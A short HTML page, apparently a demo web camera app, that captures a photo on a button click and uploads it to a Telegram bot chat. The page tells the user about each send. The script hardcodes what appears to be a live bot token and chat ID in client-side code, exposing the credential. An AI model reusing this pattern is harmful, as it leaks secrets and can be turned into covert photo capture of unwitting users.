<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Web Camera App</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    video, canvas {
      max-width: 100%;
      border: 1px solid #ccc;
      margin: 10px 0;
    }
    button {
      padding: 10px 20px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:disabled {
      background-color: #cccccc;
    }
  </style>
</head>
<body>
  <h1>Take a Photo</h1>
  <video id="video" autoplay></video>
  <button id="capture">Capture Photo</button>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const captureButton = document.getElementById('capture');

    const BOT_TOKEN = "7893827213:AAE9htRgc66S1dVuC0n2uVEL4il7vaa0nXE"; // Replace with your bot token
    const ADMIN_CHAT_ID = "5503099846"; // Replace with your admin chat ID

    // Access the user's camera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;
      })
      .catch((err) => {
        console.error("Error accessing the camera: ", err);
        alert("Failed to access the camera. Please allow camera permissions.");
      });

    // Capture photo and send to Telegram Bot
    captureButton.addEventListener('click', () => {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convert canvas to blob
      canvas.toBlob((blob) => {
        const formData = new FormData();
        formData.append('chat_id', ADMIN_CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');

        // Send the photo to Telegram Bot API
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData,
        })
          .then((response) => {
            if (response.ok) {
              alert("Photo sent to the admin successfully!");
            } else {
              alert("Failed to send photo to the admin.");
            }
          })
          .catch((err) => {
            console.error("Error sending photo: ", err);
          });
      });
    });
  </script>
</body>
</html>
